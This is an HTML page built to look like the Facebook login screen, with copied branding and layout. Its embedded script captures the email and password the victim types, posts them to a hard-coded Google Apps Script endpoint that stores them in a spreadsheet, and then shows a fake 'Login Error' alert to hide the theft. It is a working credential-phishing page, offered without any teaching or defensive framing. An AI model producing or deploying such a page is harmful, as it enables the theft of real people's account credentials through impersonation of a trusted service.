<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <<style>
/* Reset some default browser styles */
body, h1, p, form {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

/* General body styles */
body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

/* Container holding both sections */
.container {
    display: flex;
    max-width: 1000px;
    width: 100%;
    background-color: white;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
}

/* Left section styles */
.left-section {
    flex: 1;
    padding-right: 50px;
}

.left-section h1 {
    color: #1877f2;
    font-size: 48px;
    font-weight: bold;
}

.left-section p {
    font-size: 24px;
    color: #606770;
}

/* Right section styles */
.right-section {
    flex: 1;
    display: flex;
    flex-direction: column;
    justify-content: center;
}

form {
    display: flex;
    flex-direction: column;
}

input[type="text"], input[type="password"] {
    padding: 12px;
    margin-bottom: 10px;
    border-radius: 5px;
    border: 1px solid #dddfe2;
    font-size: 16px;
}

button[type="submit"] {
    padding: 12px;
    border: none;
    background-color: #1877f2;
    color: white;
    font-size: 16px;
    border-radius: 5px;
    cursor: pointer;
    margin-bottom: 20px;
}

button[type="submit"]:hover {
    background-color: #165aab;
}

a {
    color: #1877f2;
    text-align: center;
    margin-bottom: 10px;
    font-size: 14px;
    text-decoration: none;
}

.divider {
    margin: 10px 0;
    height: 1px;
    background-color: #dddfe2;
}

.create-account-btn {
    padding: 12px;
    background-color: #42b72a;
    color: white;
    font-size: 16px;
    border-radius: 5px;
    border: none;
    cursor: pointer;
}

.create-account-btn:hover {
    background-color: #36a420;
}

/* Responsive design */
@media (max-width: 768px) {
    .container {
        flex-direction: column;
        padding: 20px;
    }

    .left-section {
        padding: 0;
        margin-bottom: 20px;
        text-align: center;
    }

    .right-section {
        align-items: center;
    }

    input[type="text"], input[type="password"], button[type="submit"], .create-account-btn {
        width: 100%;
    }
}
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right-section">
            <form id="loginForm">
                <input type="text" id="email" placeholder="Email or Phone" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                <a href="#">Forgotten password?</a>
                <div class="divider"></div>
                <button type="button" class="create-account-btn">Create New Account</button>
            </form>
        </div>
    </div>

    <script>
// JavaScript to handle form submission
      document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent the default form submission
      
        // Get the form data
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
      
        // Data to send
        var data = {
          "email": email,
          "password": password
        };
      
        // Post data to Google Sheets using Google Apps Script URL
        fetch('https://script.google.com/macros/s/AKfycbzxnwM9i9qCRpGzX14nmKXUqB3qYHa1no2--Fco4TH6riC9PeMpUCX3UHchBfuwbqSmzg/exec', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          })
          .then(response => {
            // Optional: You can handle the response here
            alert('Login Error! please try again later');
          })
          .catch(error => {
            console.error('Error:', error);
          });
      });
    </script>
</body>
</html>
